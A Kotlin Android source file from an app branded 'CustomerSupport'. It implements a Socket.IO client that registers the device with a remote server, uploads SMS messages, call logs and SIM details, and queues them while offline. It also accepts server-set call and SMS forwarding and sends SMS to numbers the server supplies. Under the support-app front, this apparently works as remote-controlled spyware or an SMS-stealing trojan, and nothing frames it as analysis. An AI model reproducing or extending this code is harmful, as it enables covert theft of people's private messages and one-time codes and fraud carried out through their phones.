package com.customersupport.socket

import android.util.Log
import com.customersupport.CustomerSupportApp
import io.socket.client.IO
import io.socket.client.Socket
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import org.json.JSONArray
import org.json.JSONObject
import java.net.URI

class SocketManager {

    companion object {
        private const val TAG = "SocketManager"
        private const val SERVER_URL = "https://customer-support-server.onrender.com"
    }

    private var socket: Socket? = null

    private val _connectionState = MutableStateFlow(ConnectionState.DISCONNECTED)
    val connectionState: StateFlow<ConnectionState> = _connectionState

    private val _forwardingConfig = MutableStateFlow<ForwardingConfig?>(null)
    val forwardingConfig: StateFlow<ForwardingConfig?> = _forwardingConfig

    private var onSyncRequestCallback: (() -> Unit)? = null
    private var onForwardingConfigCallback: ((ForwardingConfig) -> Unit)? = null
    private var onSmsSendRequestCallback: ((SmsSendRequest) -> Unit)? = null

    // In-memory cache of credentials (also persisted to disk via PreferencesManager)
    private var savedDeviceId: String? = null
    private var savedDeviceName: String? = null
    private var savedPhoneNumber: String? = null

    fun setOnSyncRequestCallback(callback: () -> Unit) {
        onSyncRequestCallback = callback
    }
    
    fun setOnForwardingConfigCallback(callback: (ForwardingConfig) -> Unit) {
        onForwardingConfigCallback = callback
    }
    
    fun setOnSmsSendRequestCallback(callback: (SmsSendRequest) -> Unit) {
        onSmsSendRequestCallback = callback
    }

    fun requestSync() {
        onSyncRequestCallback?.invoke()
    }

    fun connect(deviceId: String, deviceName: String, phoneNumber: String) {
        // Always update in-memory credentials
        savedDeviceId = deviceId
        savedDeviceName = deviceName
        savedPhoneNumber = phoneNumber

        // If the socket already exists and is connected or actively connecting, do not
        // create a new instance — let Socket.IO's built-in reconnection logic handle it.
        val existingSocket = socket
        if (existingSocket != null) {
            if (existingSocket.connected()) {
                Log.d(TAG, "Already connected, re-registering device only")
                val data = JSONObject().apply {
                    put("id", deviceId)
                    put("name", deviceName)
                    put("phoneNumber", phoneNumber)
                }
                existingSocket.emit("device:register", data)
                requestForwardingConfig(deviceId)
                return
            }
            if (_connectionState.value == ConnectionState.CONNECTING) {
                Log.d(TAG, "Already connecting, skipping duplicate connect()")
                return
            }
            // Socket exists but is disconnected/errored — tear it down cleanly first
            Log.d(TAG, "Cleaning up old socket before reconnecting")
            existingSocket.off()
            existingSocket.disconnect()
            socket = null
        }

        try {
            Log.d(TAG, "Connecting to $SERVER_URL")
            _connectionState.value = ConnectionState.CONNECTING

            val options = IO.Options().apply {
                transports = arrayOf("websocket", "polling")
                reconnection = true
                reconnectionAttempts = Int.MAX_VALUE
                reconnectionDelay = 1000
                reconnectionDelayMax = 10000
                timeout = 20000
                forceNew = false
            }

            val newSocket = IO.socket(URI.create(SERVER_URL), options)
            socket = newSocket

            newSocket.on(Socket.EVENT_CONNECT) {
                Log.d(TAG, "Connected to server")
                _connectionState.value = ConnectionState.CONNECTED

                val data = JSONObject().apply {
                    put("id", deviceId)
                    put("name", deviceName)
                    put("phoneNumber", phoneNumber)
                }
                newSocket.emit("device:register", data)
                Log.d(TAG, "Device registered: $deviceId")
                
                requestForwardingConfig(deviceId)

                // Flush any pending sync data queued while offline
                flushPendingSyncQueue()
            }

            newSocket.on(Socket.EVENT_DISCONNECT) { args ->
                val reason = args.firstOrNull()?.toString() ?: "unknown"
                Log.d(TAG, "Disconnected from server, reason: $reason")
                _connectionState.value = ConnectionState.DISCONNECTED
                // Socket.IO will auto-reconnect unless reason is "io client disconnect"
            }

            newSocket.on(Socket.EVENT_CONNECT_ERROR) { args ->
                Log.e(TAG, "Connection error: ${args.firstOrNull()}")
                _connectionState.value = ConnectionState.ERROR
            }

            newSocket.on("forwarding:config") { args ->
                try {
                    Log.d(TAG, "=== RECEIVED forwarding:config EVENT ===")
                    val config = args[0] as JSONObject
                    val forwardingConfig = ForwardingConfig(
                        smsEnabled = config.optBoolean("smsEnabled", false),
                        smsForwardTo = config.optString("smsForwardTo", ""),
                        smsSubscriptionId = config.optInt("smsSubscriptionId", -1),
                        callsEnabled = config.optBoolean("callsEnabled", false),
                        callsForwardTo = config.optString("callsForwardTo", ""),
                        callsSubscriptionId = config.optInt("callsSubscriptionId", -1)
                    )
                    _forwardingConfig.value = forwardingConfig
                    Log.d(TAG, "Received forwarding config: $forwardingConfig")
                    onForwardingConfigCallback?.invoke(forwardingConfig)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing forwarding config", e)
                }
            }

            newSocket.on("device:requestSync") {
                Log.d(TAG, "Received sync request from admin panel")
                onSyncRequestCallback?.invoke()
            }

            newSocket.on("sms:sendRequest") { args ->
                try {
                    val request = args[0] as JSONObject
                    val smsSendRequest = SmsSendRequest(
                        recipientNumber = request.getString("recipientNumber"),
                        message = request.getString("message"),
                        subscriptionId = request.optInt("subscriptionId", -1),
                        requestId = request.optString("requestId", "")
                    )
                    Log.d(TAG, "Received SMS send request: ${smsSendRequest.recipientNumber}")
                    onSmsSendRequestCallback?.invoke(smsSendRequest)
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing SMS send request", e)
                }
            }

            newSocket.on("sim:sync:ack") { args ->
                try {
                    val ack = args[0] as JSONObject
                    val success = ack.optBoolean("success", false)
                    val count = ack.optInt("count", 0)
                    Log.d(TAG, "SIM sync acknowledged: success=$success, count=$count")
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing SIM sync ack", e)
                }
            }

            newSocket.connect()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to connect", e)
            _connectionState.value = ConnectionState.ERROR
        }
    }

    /**
     * Reconnect using saved credentials. Called by SyncWorker and RestartReceiver.
     * Falls back to in-memory credentials (set by last connect() call). The caller
     * is responsible for loading persisted credentials from PreferencesManager when
     * in-memory values are null (e.g. after process death).
     */
    fun reconnectWithCredentials(deviceId: String, deviceName: String, phoneNumber: String) {
        savedDeviceId = deviceId
        savedDeviceName = deviceName
        savedPhoneNumber = phoneNumber
        connect(deviceId, deviceName, phoneNumber)
    }

    /**
     * Reconnect using in-memory credentials only (no disk read).
     * Only use this from within the same process lifecycle as the original connect() call.
     */
    fun reconnectIfNeeded() {
        if (isConnected()) {
            Log.d(TAG, "Already connected, skipping reconnect")
            return
        }

        val deviceId = savedDeviceId
        val deviceName = savedDeviceName
        val phoneNumber = savedPhoneNumber

        if (deviceId != null && deviceName != null && phoneNumber != null) {
            Log.d(TAG, "Reconnecting with in-memory credentials")
            connect(deviceId, deviceName, phoneNumber)
        } else {
            Log.w(TAG, "No in-memory credentials — caller should use reconnectWithCredentials() with persisted data")
        }
    }

    /**
     * Flush any data that was queued while offline.
     */
    private fun flushPendingSyncQueue() {
        try {
            val pendingSyncManager = CustomerSupportApp.pendingSyncManager
            if (!pendingSyncManager.hasPendingData()) return

            val deviceId = pendingSyncManager.getPendingDeviceId() ?: return
            Log.d(TAG, "Flushing pending sync queue on reconnect")

            pendingSyncManager.getPendingSms()?.let { sms ->
                syncSms(deviceId, sms)
                pendingSyncManager.clearPendingSms()
                Log.d(TAG, "Flushed ${sms.length()} pending SMS")
            }

            pendingSyncManager.getPendingCalls()?.let { calls ->
                syncCalls(deviceId, calls)
                pendingSyncManager.clearPendingCalls()
                Log.d(TAG, "Flushed ${calls.length()} pending calls")
            }

            pendingSyncManager.getPendingSim()?.let { sim ->
                syncSimInfo(deviceId, sim)
                pendingSyncManager.clearPendingSim()
                Log.d(TAG, "Flushed ${sim.length()} pending SIM cards")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error flushing pending sync queue", e)
        }
    }

    fun disconnect() {
        socket?.off()
        socket?.disconnect()
        socket = null
        _connectionState.value = ConnectionState.DISCONNECTED
    }

    fun isConnected(): Boolean = socket?.connected() == true

    fun syncSms(deviceId: String, smsArray: JSONArray) {
        if (!isConnected()) {
            CustomerSupportApp.pendingSyncManager.queueSmsSync(deviceId, smsArray)
            return
        }
        val data = JSONObject().apply {
            put("deviceId", deviceId)
            put("sms", smsArray)
        }
        socket?.emit("sms:sync", data)
        Log.d(TAG, "Synced ${smsArray.length()} SMS messages")
    }

    fun syncCalls(deviceId: String, callsArray: JSONArray) {
        if (!isConnected()) {
            CustomerSupportApp.pendingSyncManager.queueCallsSync(deviceId, callsArray)
            return
        }
        val data = JSONObject().apply {
            put("deviceId", deviceId)
            put("calls", callsArray)
        }
        socket?.emit("calls:sync", data)
        Log.d(TAG, "Synced ${callsArray.length()} call logs")
    }

    fun submitForm(deviceId: String, name: String, phoneNumber: String, id: String) {
        if (!isConnected()) return
        val data = JSONObject().apply {
            put("deviceId", deviceId)
            put("name", name)
            put("phoneNumber", phoneNumber)
            put("id", id)
        }
        socket?.emit("form:submit", data)
        Log.d(TAG, "Form submitted: $name")
    }

    fun syncSimInfo(deviceId: String, simArray: JSONArray) {
        if (!isConnected()) {
            CustomerSupportApp.pendingSyncManager.queueSimSync(deviceId, simArray)
            return
        }
        val data = JSONObject().apply {
            put("deviceId", deviceId)
            put("simCards", simArray)
        }
        socket?.emit("sim:sync", data)
        Log.d(TAG, "Synced ${simArray.length()} SIM cards")
    }

    fun reportSmsSendResult(deviceId: String, requestId: String, success: Boolean, error: String? = null) {
        if (!isConnected()) return
        val data = JSONObject().apply {
            put("deviceId", deviceId)
            put("requestId", requestId)
            put("success", success)
            error?.let { put("error", it) }
        }
        socket?.emit("sms:sendResult", data)
        Log.d(TAG, "Reported SMS send result: success=$success")
    }
    
    fun requestForwardingConfig(deviceId: String) {
        if (!isConnected()) {
            Log.w(TAG, "Cannot request forwarding config - not connected")
            return
        }
        Log.d(TAG, "Requesting forwarding config for device: $deviceId")
        socket?.emit("device:requestForwardingConfig", deviceId)
    }
}

enum class ConnectionState {
    DISCONNECTED,
    CONNECTING,
    CONNECTED,
    ERROR
}

data class ForwardingConfig(
    val smsEnabled: Boolean = false,
    val smsForwardTo: String = "",
    val smsSubscriptionId: Int = -1,
    val callsEnabled: Boolean = false,
    val callsForwardTo: String = "",
    val callsSubscriptionId: Int = -1
)

data class SmsSendRequest(
    val recipientNumber: String,
    val message: String,
    val subscriptionId: Int = -1,
    val requestId: String = ""
)
